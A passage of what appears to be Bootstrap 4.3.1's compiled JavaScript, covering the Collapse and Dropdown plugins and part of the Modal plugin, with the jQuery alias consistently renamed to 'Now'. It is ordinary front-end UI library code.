          var filterElement = [].slice.call(document.querySelectorAll(selector)).filter(function (foundElem) {
            return foundElem === element;
          });

          if (selector !== null && filterElement.length > 0) {
            this._selector = selector;

            this._triggerArray.push(elem);
          }
        }

        this._parent = this._config.parent ? this._getParent() : null;

        if (!this._config.parent) {
          this._addAriaAndCollapsedClass(this._element, this._triggerArray);
        }

        if (this._config.toggle) {
          this.toggle();
        }
      } // Getters


      var _proto = Collapse.prototype;

      // Public
      _proto.toggle = function toggle() {
        if (Now(this._element).hasClass(ClassNameNow3.SHOW)) {
          this.hide();
        } else {
          this.show();
        }
      };

      _proto.show = function show() {
        var _this = this;

        if (this._isTransitioning || Now(this._element).hasClass(ClassNameNow3.SHOW)) {
          return;
        }

        var actives;
        var activesData;

        if (this._parent) {
          actives = [].slice.call(this._parent.querySelectorAll(SelectorNow3.ACTIVES)).filter(function (elem) {
            if (typeof _this._config.parent === 'string') {
              return elem.getAttribute('data-parent') === _this._config.parent;
            }

            return elem.classList.contains(ClassNameNow3.COLLAPSE);
          });

          if (actives.length === 0) {
            actives = null;
          }
        }

        if (actives) {
          activesData = Now(actives).not(this._selector).data(DATA_KEYNow3);

          if (activesData && activesData._isTransitioning) {
            return;
          }
        }

        var startEvent = Now.Event(EventNow3.SHOW);
        Now(this._element).trigger(startEvent);

        if (startEvent.isDefaultPrevented()) {
          return;
        }

        if (actives) {
          Collapse._jQueryInterface.call(Now(actives).not(this._selector), 'hide');

          if (!activesData) {
            Now(actives).data(DATA_KEYNow3, null);
          }
        }

        var dimension = this._getDimension();

        Now(this._element).removeClass(ClassNameNow3.COLLAPSE).addClass(ClassNameNow3.COLLAPSING);
        this._element.style[dimension] = 0;

        if (this._triggerArray.length) {
          Now(this._triggerArray).removeClass(ClassNameNow3.COLLAPSED).attr('aria-expanded', true);
        }

        this.setTransitioning(true);

        var complete = function complete() {
          Now(_this._element).removeClass(ClassNameNow3.COLLAPSING).addClass(ClassNameNow3.COLLAPSE).addClass(ClassNameNow3.SHOW);
          _this._element.style[dimension] = '';

          _this.setTransitioning(false);

          Now(_this._element).trigger(EventNow3.SHOWN);
        };

        var capitalizedDimension = dimension[0].toUpperCase() + dimension.slice(1);
        var scrollSize = "scroll" + capitalizedDimension;
        var transitionDuration = Util.getTransitionDurationFromElement(this._element);
        Now(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        this._element.style[dimension] = this._element[scrollSize] + "px";
      };

      _proto.hide = function hide() {
        var _this2 = this;

        if (this._isTransitioning || !Now(this._element).hasClass(ClassNameNow3.SHOW)) {
          return;
        }

        var startEvent = Now.Event(EventNow3.HIDE);
        Now(this._element).trigger(startEvent);

        if (startEvent.isDefaultPrevented()) {
          return;
        }

        var dimension = this._getDimension();

        this._element.style[dimension] = this._element.getBoundingClientRect()[dimension] + "px";
        Util.reflow(this._element);
        Now(this._element).addClass(ClassNameNow3.COLLAPSING).removeClass(ClassNameNow3.COLLAPSE).removeClass(ClassNameNow3.SHOW);
        var triggerArrayLength = this._triggerArray.length;

        if (triggerArrayLength > 0) {
          for (var i = 0; i < triggerArrayLength; i++) {
            var trigger = this._triggerArray[i];
            var selector = Util.getSelectorFromElement(trigger);

            if (selector !== null) {
              var Nowelem = Now([].slice.call(document.querySelectorAll(selector)));

              if (!Nowelem.hasClass(ClassNameNow3.SHOW)) {
                Now(trigger).addClass(ClassNameNow3.COLLAPSED).attr('aria-expanded', false);
              }
            }
          }
        }

        this.setTransitioning(true);

        var complete = function complete() {
          _this2.setTransitioning(false);

          Now(_this2._element).removeClass(ClassNameNow3.COLLAPSING).addClass(ClassNameNow3.COLLAPSE).trigger(EventNow3.HIDDEN);
        };

        this._element.style[dimension] = '';
        var transitionDuration = Util.getTransitionDurationFromElement(this._element);
        Now(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
      };

      _proto.setTransitioning = function setTransitioning(isTransitioning) {
        this._isTransitioning = isTransitioning;
      };

      _proto.dispose = function dispose() {
        Now.removeData(this._element, DATA_KEYNow3);
        this._config = null;
        this._parent = null;
        this._element = null;
        this._triggerArray = null;
        this._isTransitioning = null;
      } // Private
      ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, DefaultNow1, config);
        config.toggle = Boolean(config.toggle); // Coerce string values

        Util.typeCheckConfig(NAMENow3, config, DefaultTypeNow1);
        return config;
      };

      _proto._getDimension = function _getDimension() {
        var hasWidth = Now(this._element).hasClass(Dimension.WIDTH);
        return hasWidth ? Dimension.WIDTH : Dimension.HEIGHT;
      };

      _proto._getParent = function _getParent() {
        var _this3 = this;

        var parent;

        if (Util.isElement(this._config.parent)) {
          parent = this._config.parent; // It's a jQuery object

          if (typeof this._config.parent.jquery !== 'undefined') {
            parent = this._config.parent[0];
          }
        } else {
          parent = document.querySelector(this._config.parent);
        }

        var selector = "[data-toggle=\"collapse\"][data-parent=\"" + this._config.parent + "\"]";
        var children = [].slice.call(parent.querySelectorAll(selector));
        Now(children).each(function (i, element) {
          _this3._addAriaAndCollapsedClass(Collapse._getTargetFromElement(element), [element]);
        });
        return parent;
      };

      _proto._addAriaAndCollapsedClass = function _addAriaAndCollapsedClass(element, triggerArray) {
        var isOpen = Now(element).hasClass(ClassNameNow3.SHOW);

        if (triggerArray.length) {
          Now(triggerArray).toggleClass(ClassNameNow3.COLLAPSED, !isOpen).attr('aria-expanded', isOpen);
        }
      } // Static
      ;

      Collapse._getTargetFromElement = function _getTargetFromElement(element) {
        var selector = Util.getSelectorFromElement(element);
        return selector ? document.querySelector(selector) : null;
      };

      Collapse._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var Nowthis = Now(this);
          var data = Nowthis.data(DATA_KEYNow3);

          var _config = _objectSpread({}, DefaultNow1, Nowthis.data(), typeof config === 'object' && config ? config : {});

          if (!data && _config.toggle && /show|hide/.test(config)) {
            _config.toggle = false;
          }

          if (!data) {
            data = new Collapse(this, _config);
            Nowthis.data(DATA_KEYNow3, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Collapse, null, [{
        key: "VERSION",
        get: function get() {
          return VERSIONNow3;
        }
      }, {
        key: "Default",
        get: function get() {
          return DefaultNow1;
        }
      }]);

      return Collapse;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  Now(document).on(EventNow3.CLICK_DATA_API, SelectorNow3.DATA_TOGGLE, function (event) {
    // preventDefault only for <a> elements (which change the URL) not inside the collapsible element
    if (event.currentTarget.tagName === 'A') {
      event.preventDefault();
    }

    var Nowtrigger = Now(this);
    var selector = Util.getSelectorFromElement(this);
    var selectors = [].slice.call(document.querySelectorAll(selector));
    Now(selectors).each(function () {
      var Nowtarget = Now(this);
      var data = Nowtarget.data(DATA_KEYNow3);
      var config = data ? 'toggle' : Nowtrigger.data();

      Collapse._jQueryInterface.call(Nowtarget, config);
    });
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  Now.fn[NAMENow3] = Collapse._jQueryInterface;
  Now.fn[NAMENow3].Constructor = Collapse;

  Now.fn[NAMENow3].noConflict = function () {
    Now.fn[NAMENow3] = JQUERY_NO_CONFLICTNow3;
    return Collapse._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAMENow4 = 'dropdown';
  var VERSIONNow4 = '4.3.1';
  var DATA_KEYNow4 = 'bs.dropdown';
  var EVENT_KEYNow4 = "." + DATA_KEYNow4;
  var DATA_API_KEYNow4 = '.data-api';
  var JQUERY_NO_CONFLICTNow4 = Now.fn[NAMENow4];
  var ESCAPE_KEYCODE = 27; // KeyboardEvent.which value for Escape (Esc) key

  var SPACE_KEYCODE = 32; // KeyboardEvent.which value for space key

  var TAB_KEYCODE = 9; // KeyboardEvent.which value for tab key

  var ARROW_UP_KEYCODE = 38; // KeyboardEvent.which value for up arrow key

  var ARROW_DOWN_KEYCODE = 40; // KeyboardEvent.which value for down arrow key

  var RIGHT_MOUSE_BUTTON_WHICH = 3; // MouseEvent.which value for the right button (assuming a right-handed mouse)

  var REGEXP_KEYDOWN = new RegExp(ARROW_UP_KEYCODE + "|" + ARROW_DOWN_KEYCODE + "|" + ESCAPE_KEYCODE);
  var EventNow4 = {
    HIDE: "hide" + EVENT_KEYNow4,
    HIDDEN: "hidden" + EVENT_KEYNow4,
    SHOW: "show" + EVENT_KEYNow4,
    SHOWN: "shown" + EVENT_KEYNow4,
    CLICK: "click" + EVENT_KEYNow4,
    CLICK_DATA_API: "click" + EVENT_KEYNow4 + DATA_API_KEYNow4,
    KEYDOWN_DATA_API: "keydown" + EVENT_KEYNow4 + DATA_API_KEYNow4,
    KEYUP_DATA_API: "keyup" + EVENT_KEYNow4 + DATA_API_KEYNow4
  };
  var ClassNameNow4 = {
    DISABLED: 'disabled',
    SHOW: 'show',
    DROPUP: 'dropup',
    DROPRIGHT: 'dropright',
    DROPLEFT: 'dropleft',
    MENURIGHT: 'dropdown-menu-right',
    MENULEFT: 'dropdown-menu-left',
    POSITION_STATIC: 'position-static'
  };
  var SelectorNow4 = {
    DATA_TOGGLE: '[data-toggle="dropdown"]',
    FORM_CHILD: '.dropdown form',
    MENU: '.dropdown-menu',
    NAVBAR_NAV: '.navbar-nav',
    VISIBLE_ITEMS: '.dropdown-menu .dropdown-item:not(.disabled):not(:disabled)'
  };
  var AttachmentMap = {
    TOP: 'top-start',
    TOPEND: 'top-end',
    BOTTOM: 'bottom-start',
    BOTTOMEND: 'bottom-end',
    RIGHT: 'right-start',
    RIGHTEND: 'right-end',
    LEFT: 'left-start',
    LEFTEND: 'left-end'
  };
  var DefaultNow2 = {
    offset: 0,
    flip: true,
    boundary: 'scrollParent',
    reference: 'toggle',
    display: 'dynamic'
  };
  var DefaultTypeNow2 = {
    offset: '(number|string|function)',
    flip: 'boolean',
    boundary: '(string|element)',
    reference: '(string|element)',
    display: 'string'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Dropdown =
    /*#__PURE__*/
    function () {
      function Dropdown(element, config) {
        this._element = element;
        this._popper = null;
        this._config = this._getConfig(config);
        this._menu = this._getMenuElement();
        this._inNavbar = this._detectNavbar();

        this._addEventListeners();
      } // Getters


      var _proto = Dropdown.prototype;

      // Public
      _proto.toggle = function toggle() {
        if (this._element.disabled || Now(this._element).hasClass(ClassNameNow4.DISABLED)) {
          return;
        }

        var parent = Dropdown._getParentFromElement(this._element);

        var isActive = Now(this._menu).hasClass(ClassNameNow4.SHOW);

        Dropdown._clearMenus();

        if (isActive) {
          return;
        }

        var relatedTarget = {
          relatedTarget: this._element
        };
        var showEvent = Now.Event(EventNow4.SHOW, relatedTarget);
        Now(parent).trigger(showEvent);

        if (showEvent.isDefaultPrevented()) {
          return;
        } // Disable totally Popper.js for Dropdown in Navbar


        if (!this._inNavbar) {
          /**
           * Check for Popper dependency
           * Popper - https://popper.js.org
           */
          if (typeof Popper === 'undefined') {
            throw new TypeError('Bootstrap\'s dropdowns require Popper.js (https://popper.js.org/)');
          }

          var referenceElement = this._element;

          if (this._config.reference === 'parent') {
            referenceElement = parent;
          } else if (Util.isElement(this._config.reference)) {
            referenceElement = this._config.reference; // Check if it's jQuery element

            if (typeof this._config.reference.jquery !== 'undefined') {
              referenceElement = this._config.reference[0];
            }
          } // If boundary is not `scrollParent`, then set position to `static`
          // to allow the menu to "escape" the scroll parent's boundaries
          // https://github.com/twbs/bootstrap/issues/24251


          if (this._config.boundary !== 'scrollParent') {
            Now(parent).addClass(ClassNameNow4.POSITION_STATIC);
          }

          this._popper = new Popper(referenceElement, this._menu, this._getPopperConfig());
        } // If this is a touch-enabled device we add extra
        // empty mouseover listeners to the body's immediate children;
        // only needed because of broken event delegation on iOS
        // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html


        if ('ontouchstart' in document.documentElement && Now(parent).closest(SelectorNow4.NAVBAR_NAV).length === 0) {
          Now(document.body).children().on('mouseover', null, Now.noop);
        }

        this._element.focus();

        this._element.setAttribute('aria-expanded', true);

        Now(this._menu).toggleClass(ClassNameNow4.SHOW);
        Now(parent).toggleClass(ClassNameNow4.SHOW).trigger(Now.Event(EventNow4.SHOWN, relatedTarget));
      };

      _proto.show = function show() {
        if (this._element.disabled || Now(this._element).hasClass(ClassNameNow4.DISABLED) || Now(this._menu).hasClass(ClassNameNow4.SHOW)) {
          return;
        }

        var relatedTarget = {
          relatedTarget: this._element
        };
        var showEvent = Now.Event(EventNow4.SHOW, relatedTarget);

        var parent = Dropdown._getParentFromElement(this._element);

        Now(parent).trigger(showEvent);

        if (showEvent.isDefaultPrevented()) {
          return;
        }

        Now(this._menu).toggleClass(ClassNameNow4.SHOW);
        Now(parent).toggleClass(ClassNameNow4.SHOW).trigger(Now.Event(EventNow4.SHOWN, relatedTarget));
      };

      _proto.hide = function hide() {
        if (this._element.disabled || Now(this._element).hasClass(ClassNameNow4.DISABLED) || !Now(this._menu).hasClass(ClassNameNow4.SHOW)) {
          return;
        }

        var relatedTarget = {
          relatedTarget: this._element
        };
        var hideEvent = Now.Event(EventNow4.HIDE, relatedTarget);

        var parent = Dropdown._getParentFromElement(this._element);

        Now(parent).trigger(hideEvent);

        if (hideEvent.isDefaultPrevented()) {
          return;
        }

        Now(this._menu).toggleClass(ClassNameNow4.SHOW);
        Now(parent).toggleClass(ClassNameNow4.SHOW).trigger(Now.Event(EventNow4.HIDDEN, relatedTarget));
      };

      _proto.dispose = function dispose() {
        Now.removeData(this._element, DATA_KEYNow4);
        Now(this._element).off(EVENT_KEYNow4);
        this._element = null;
        this._menu = null;

        if (this._popper !== null) {
          this._popper.destroy();

          this._popper = null;
        }
      };

      _proto.update = function update() {
        this._inNavbar = this._detectNavbar();

        if (this._popper !== null) {
          this._popper.scheduleUpdate();
        }
      } // Private
      ;

      _proto._addEventListeners = function _addEventListeners() {
        var _this = this;

        Now(this._element).on(EventNow4.CLICK, function (event) {
          event.preventDefault();
          event.stopPropagation();

          _this.toggle();
        });
      };

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, this.constructor.Default, Now(this._element).data(), config);
        Util.typeCheckConfig(NAMENow4, config, this.constructor.DefaultType);
        return config;
      };

      _proto._getMenuElement = function _getMenuElement() {
        if (!this._menu) {
          var parent = Dropdown._getParentFromElement(this._element);

          if (parent) {
            this._menu = parent.querySelector(SelectorNow4.MENU);
          }
        }

        return this._menu;
      };

      _proto._getPlacement = function _getPlacement() {
        var NowparentDropdown = Now(this._element.parentNode);
        var placement = AttachmentMap.BOTTOM; // Handle dropup

        if (NowparentDropdown.hasClass(ClassNameNow4.DROPUP)) {
          placement = AttachmentMap.TOP;

          if (Now(this._menu).hasClass(ClassNameNow4.MENURIGHT)) {
            placement = AttachmentMap.TOPEND;
          }
        } else if (NowparentDropdown.hasClass(ClassNameNow4.DROPRIGHT)) {
          placement = AttachmentMap.RIGHT;
        } else if (NowparentDropdown.hasClass(ClassNameNow4.DROPLEFT)) {
          placement = AttachmentMap.LEFT;
        } else if (Now(this._menu).hasClass(ClassNameNow4.MENURIGHT)) {
          placement = AttachmentMap.BOTTOMEND;
        }

        return placement;
      };

      _proto._detectNavbar = function _detectNavbar() {
        return Now(this._element).closest('.navbar').length > 0;
      };

      _proto._getOffset = function _getOffset() {
        var _this2 = this;

        var offset = {};

        if (typeof this._config.offset === 'function') {
          offset.fn = function (data) {
            data.offsets = _objectSpread({}, data.offsets, _this2._config.offset(data.offsets, _this2._element) || {});
            return data;
          };
        } else {
          offset.offset = this._config.offset;
        }

        return offset;
      };

      _proto._getPopperConfig = function _getPopperConfig() {
        var popperConfig = {
          placement: this._getPlacement(),
          modifiers: {
            offset: this._getOffset(),
            flip: {
              enabled: this._config.flip
            },
            preventOverflow: {
              boundariesElement: this._config.boundary
            }
          } // Disable Popper.js if we have a static display

        };

        if (this._config.display === 'static') {
          popperConfig.modifiers.applyStyle = {
            enabled: false
          };
        }

        return popperConfig;
      } // Static
      ;

      Dropdown._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = Now(this).data(DATA_KEYNow4);

          var _config = typeof config === 'object' ? config : null;

          if (!data) {
            data = new Dropdown(this, _config);
            Now(this).data(DATA_KEYNow4, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      Dropdown._clearMenus = function _clearMenus(event) {
        if (event && (event.which === RIGHT_MOUSE_BUTTON_WHICH || event.type === 'keyup' && event.which !== TAB_KEYCODE)) {
          return;
        }

        var toggles = [].slice.call(document.querySelectorAll(SelectorNow4.DATA_TOGGLE));

        for (var i = 0, len = toggles.length; i < len; i++) {
          var parent = Dropdown._getParentFromElement(toggles[i]);

          var context = Now(toggles[i]).data(DATA_KEYNow4);
          var relatedTarget = {
            relatedTarget: toggles[i]
          };

          if (event && event.type === 'click') {
            relatedTarget.clickEvent = event;
          }

          if (!context) {
            continue;
          }

          var dropdownMenu = context._menu;

          if (!Now(parent).hasClass(ClassNameNow4.SHOW)) {
            continue;
          }

          if (event && (event.type === 'click' && /input|textarea/i.test(event.target.tagName) || event.type === 'keyup' && event.which === TAB_KEYCODE) && Now.contains(parent, event.target)) {
            continue;
          }

          var hideEvent = Now.Event(EventNow4.HIDE, relatedTarget);
          Now(parent).trigger(hideEvent);

          if (hideEvent.isDefaultPrevented()) {
            continue;
          } // If this is a touch-enabled device we remove the extra
          // empty mouseover listeners we added for iOS support


          if ('ontouchstart' in document.documentElement) {
            Now(document.body).children().off('mouseover', null, Now.noop);
          }

          toggles[i].setAttribute('aria-expanded', 'false');
          Now(dropdownMenu).removeClass(ClassNameNow4.SHOW);
          Now(parent).removeClass(ClassNameNow4.SHOW).trigger(Now.Event(EventNow4.HIDDEN, relatedTarget));
        }
      };

      Dropdown._getParentFromElement = function _getParentFromElement(element) {
        var parent;
        var selector = Util.getSelectorFromElement(element);

        if (selector) {
          parent = document.querySelector(selector);
        }

        return parent || element.parentNode;
      } // eslint-disable-next-line complexity
      ;

      Dropdown._dataApiKeydownHandler = function _dataApiKeydownHandler(event) {
        // If not input/textarea:
        //  - And not a key in REGEXP_KEYDOWN => not a dropdown command
        // If input/textarea:
        //  - If space key => not a dropdown command
        //  - If key is other than escape
        //    - If key is not up or down => not a dropdown command
        //    - If trigger inside the menu => not a dropdown command
        if (/input|textarea/i.test(event.target.tagName) ? event.which === SPACE_KEYCODE || event.which !== ESCAPE_KEYCODE && (event.which !== ARROW_DOWN_KEYCODE && event.which !== ARROW_UP_KEYCODE || Now(event.target).closest(SelectorNow4.MENU).length) : !REGEXP_KEYDOWN.test(event.which)) {
          return;
        }

        event.preventDefault();
        event.stopPropagation();

        if (this.disabled || Now(this).hasClass(ClassNameNow4.DISABLED)) {
          return;
        }

        var parent = Dropdown._getParentFromElement(this);

        var isActive = Now(parent).hasClass(ClassNameNow4.SHOW);

        if (!isActive || isActive && (event.which === ESCAPE_KEYCODE || event.which === SPACE_KEYCODE)) {
          if (event.which === ESCAPE_KEYCODE) {
            var toggle = parent.querySelector(SelectorNow4.DATA_TOGGLE);
            Now(toggle).trigger('focus');
          }

          Now(this).trigger('click');
          return;
        }

        var items = [].slice.call(parent.querySelectorAll(SelectorNow4.VISIBLE_ITEMS));

        if (items.length === 0) {
          return;
        }

        var index = items.indexOf(event.target);

        if (event.which === ARROW_UP_KEYCODE && index > 0) {
          // Up
          index--;
        }

        if (event.which === ARROW_DOWN_KEYCODE && index < items.length - 1) {
          // Down
          index++;
        }

        if (index < 0) {
          index = 0;
        }

        items[index].focus();
      };

      _createClass(Dropdown, null, [{
        key: "VERSION",
        get: function get() {
          return VERSIONNow4;
        }
      }, {
        key: "Default",
        get: function get() {
          return DefaultNow2;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultTypeNow2;
        }
      }]);

      return Dropdown;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  Now(document).on(EventNow4.KEYDOWN_DATA_API, SelectorNow4.DATA_TOGGLE, Dropdown._dataApiKeydownHandler).on(EventNow4.KEYDOWN_DATA_API, SelectorNow4.MENU, Dropdown._dataApiKeydownHandler).on(EventNow4.CLICK_DATA_API + " " + EventNow4.KEYUP_DATA_API, Dropdown._clearMenus).on(EventNow4.CLICK_DATA_API, SelectorNow4.DATA_TOGGLE, function (event) {
    event.preventDefault();
    event.stopPropagation();

    Dropdown._jQueryInterface.call(Now(this), 'toggle');
  }).on(EventNow4.CLICK_DATA_API, SelectorNow4.FORM_CHILD, function (e) {
    e.stopPropagation();
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  Now.fn[NAMENow4] = Dropdown._jQueryInterface;
  Now.fn[NAMENow4].Constructor = Dropdown;

  Now.fn[NAMENow4].noConflict = function () {
    Now.fn[NAMENow4] = JQUERY_NO_CONFLICTNow4;
    return Dropdown._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAMENow5 = 'modal';
  var VERSIONNow5 = '4.3.1';
  var DATA_KEYNow5 = 'bs.modal';
  var EVENT_KEYNow5 = "." + DATA_KEYNow5;
  var DATA_API_KEYNow5 = '.data-api';
  var JQUERY_NO_CONFLICTNow5 = Now.fn[NAMENow5];
  var ESCAPE_KEYCODENow1 = 27; // KeyboardEvent.which value for Escape (Esc) key

  var DefaultNow3 = {
    backdrop: true,
    keyboard: true,
    focus: true,
    show: true
  };
  var DefaultTypeNow3 = {
    backdrop: '(boolean|string)',
    keyboard: 'boolean',
    focus: 'boolean',
    show: 'boolean'
  };
  var EventNow5 = {
    HIDE: "hide" + EVENT_KEYNow5,
    HIDDEN: "hidden" + EVENT_KEYNow5,
    SHOW: "show" + EVENT_KEYNow5,
    SHOWN: "shown" + EVENT_KEYNow5,
    FOCUSIN: "focusin" + EVENT_KEYNow5,
    RESIZE: "resize" + EVENT_KEYNow5,
    CLICK_DISMISS: "click.dismiss" + EVENT_KEYNow5,
    KEYDOWN_DISMISS: "keydown.dismiss" + EVENT_KEYNow5,
    MOUSEUP_DISMISS: "mouseup.dismiss" + EVENT_KEYNow5,
    MOUSEDOWN_DISMISS: "mousedown.dismiss" + EVENT_KEYNow5,
    CLICK_DATA_API: "click" + EVENT_KEYNow5 + DATA_API_KEYNow5
  };
  var ClassNameNow5 = {
    SCROLLABLE: 'modal-dialog-scrollable',
    SCROLLBAR_MEASURER: 'modal-scrollbar-measure',
    BACKDROP: 'modal-backdrop',
    OPEN: 'modal-open',
    FADE: 'fade',
    SHOW: 'show'
  };
  var SelectorNow5 = {
    DIALOG: '.modal-dialog',
    MODAL_BODY: '.modal-body',
    DATA_TOGGLE: '[data-toggle="modal"]',
    DATA_DISMISS: '[data-dismiss="modal"]',
    FIXED_CONTENT: '.fixed-top, .fixed-bottom, .is-fixed, .sticky-top',
    STICKY_CONTENT: '.sticky-top'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Modal =
    /*#__PURE__*/
    function () {
      function Modal(element, config) {
        this._config = this._getConfig(config);
        this._element = element;
        this._dialog = element.querySelector(SelectorNow5.DIALOG);
        this._backdrop = null;
        this._isShown = false;
        this._isBodyOverflowing = false;
        this._ignoreBackdropClick = false;
        this._isTransitioning = false;
        this._scrollbarWidth = 0;
      } // Getters


      var _proto = Modal.prototype;

      // Public
      _proto.toggle = function toggle(relatedTarget) {
        return this._isShown ? this.hide() : this.show(relatedTarget);
      };

      _proto.show = function show(relatedTarget) {
        var _this = this;

        if (this._isShown || this._isTransitioning) {
          return;
        }

        if (Now(this._element).hasClass(ClassNameNow5.FADE)) {
          this._isTransitioning = true;
        }

        var showEvent = Now.Event(EventNow5.SHOW, {
          relatedTarget: relatedTarget
        });
        Now(this._element).trigger(showEvent);

        if (this._isShown || showEvent.isDefaultPrevented()) {
          return;
        }

        this._isShown = true;

        this._checkScrollbar();

        this._setScrollbar();

        this._adjustDialog();

        this._setEscapeEvent();

        this._setResizeEvent();

        Now(this._element).on(EventNow5.CLICK_DISMISS, SelectorNow5.DATA_DISMISS, function (event) {
          return _this.hide(event);
        });
        Now(this._dialog).on(EventNow5.MOUSEDOWN_DISMISS, function () {
          Now(_this._element).one(EventNow5.MOUSEUP_DISMISS, function (event) {
            if (Now(event.target).is(_this._element)) {
              _this._ignoreBackdropClick = true;
            }
          });
        });

        this._showBackdrop(function () {
          return _this._showElement(relatedTarget);
        });
      };

      _proto.hide = function hide(event) {
        var _this2 = this;

        if (event) {
          event.preventDefault();
        }

        if (!this._isShown || this._isTransitioning) {
          return;
        }

        var hideEvent = Now.Event(EventNow5.HIDE);
        Now(this._element).trigger(hideEvent);

        if (!this._isShown || hideEvent.isDefaultPrevented()) {
          return;
        }

        this._isShown = false;
        var transition = Now(this._element).hasClass(ClassNameNow5.FADE);

        if (transition) {
          this._isTransitioning = true;
        }

        this._setEscapeEvent();

        this._setResizeEvent();

        Now(document).off(EventNow5.FOCUSIN);
        Now(this._element).removeClass(ClassNameNow5.SHOW);
        Now(this._element).off(EventNow5.CLICK_DISMISS);
        Now(this._dialog).off(EventNow5.MOUSEDOWN_DISMISS);

        if (transition) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._element);
          Now(this._element).one(Util.TRANSITION_END, function (event) {
            return _this2._hideModal(event);
          }).emulateTransitionEnd(transitionDuration);
        } else {
          this._hideModal();
        }
      };

      _proto.dispose = function dispose() {
        [window, this._element, this._dialog].forEach(function (htmlElement) {
          return Now(htmlElement).off(EVENT_KEYNow5);
        });
        /**
         * `document` has 2 events `Event.FOCUSIN` and `Event.CLICK_DATA_API`
         * Do not move `document` in `htmlElements` array
         * It will remove `Event.CLICK_DATA_API` event that should remain
         */

        Now(document).off(EventNow5.FOCUSIN);
        Now.removeData(this._element, DATA_KEYNow5);
        this._config = null;
        this._element = null;
        this._dialog = null;
        this._backdrop = null;
        this._isShown = null;
        this._isBodyOverflowing = null;
        this._ignoreBackdropClick = null;
        this._isTransitioning = null;
        this._scrollbarWidth = null;
      };

      _proto.handleUpdate = function handleUpdate() {
        this._adjustDialog();
      } // Private
      ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, DefaultNow3, config);
        Util.typeCheckConfig(NAMENow5, config, DefaultTypeNow3);
        return config;
      };

      _proto._showElement = function _showElement(relatedTarget) {
        var _this3 = this;

        var transition = Now(this._element).hasClass(ClassNameNow5.FADE);

        if (!this._element.parentNode || this._element.parentNode.nodeType !== Node.ELEMENT_NODE) {
          // Don't move modal's DOM position
          document.body.appendChild(this._element);
        }

        this._element.style.display = 'block';

        this._element.removeAttribute('aria-hidden');

        this._element.setAttribute('aria-modal', true);

        if (Now(this._dialog).hasClass(ClassNameNow5.SCROLLABLE)) {
          this._dialog.querySelector(SelectorNow5.MODAL_BODY).scrollTop = 0;
        } else {
          this._element.scrollTop = 0;
        }

        if (transition) {
          Util.reflow(this._element);
        }

        Now(this._element).addClass(ClassNameNow5.SHOW);

        if (this._config.focus) {
          this._enforceFocus();
        }

        var shownEvent = Now.Event(EventNow5.SHOWN, {
          relatedTarget: relatedTarget
        });

        var transitionComplete = function transitionComplete() {
          if (_this3._config.focus) {
            _this3._element.focus();
          }

          _this3._isTransitioning = false;
          Now(_this3._element).trigger(shownEvent);
        };

        if (transition) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._dialog);
          Now(this._dialog).one(Util.TRANSITION_END, transitionComplete).emulateTransitionEnd(transitionDuration);
        } else {
          transitionComplete();
        }
      };

      _proto._enforceFocus = function _enforceFocus() {
        var _this4 = this;

        Now(document).off(EventNow5.FOCUSIN) // Guard against infinite focus loop
          .on(EventNow5.FOCUSIN, function (event) {
            if (document !== event.target && _this4._element !== event.target && Now(_this4._element).has(event.target).length === 0) {
              _this4._element.focus();
            }
          });
      };

      _proto._setEscapeEvent = function _setEscapeEvent() {
        var _this5 = this;

        if (this._isShown && this._config.keyboard) {
          Now(this._element).on(EventNow5.KEYDOWN_DISMISS, function (event) {
            if (event.which === ESCAPE_KEYCODENow1) {
              event.preventDefault();

              _this5.hide();
            }
          });
        } else if (!this._isShown) {
          Now(this._element).off(EventNow5.KEYDOWN_DISMISS);
        }
      };

      _proto._setResizeEvent = function _setResizeEvent() {
        var _this6 = this;

        if (this._isShown) {
          Now(window).on(EventNow5.RESIZE, function (event) {
            return _this6.handleUpdate(event);
          });
        } else {
          Now(window).off(EventNow5.RESIZE);
        }
      };

      _proto._hideModal = function _hideModal() {
        var _this7 = this;

        this._element.style.display = 'none';

        this._element.setAttribute('aria-hidden', true);

        this._element.removeAttribute('aria-modal');

        this._isTransitioning = false;

        this._showBackdrop(function () {
          Now(document.body).removeClass(ClassNameNow5.OPEN);

          _this7._resetAdjustments();

          _this7._resetScrollbar();

          Now(_this7._element).trigger(EventNow5.HIDDEN);
        });
      };

      _proto._removeBackdrop = function _removeBackdrop() {
        if (this._backdrop) {
          Now(this._backdrop).remove();
          this._backdrop = null;
        }
      };

      _proto._showBackdrop = function _showBackdrop(callback) {
        var _this8 = this;

        var animate = Now(this._element).hasClass(ClassNameNow5.FADE) ? ClassNameNow5.FADE : '';

        if (this._isShown && this._config.backdrop) {
          this._backdrop = document.createElement('div');
          this._backdrop.className = ClassNameNow5.BACKDROP;

          if (animate) {
            this._backdrop.classList.add(animate);
          }

          Now(this._backdrop).appendTo(document.body);
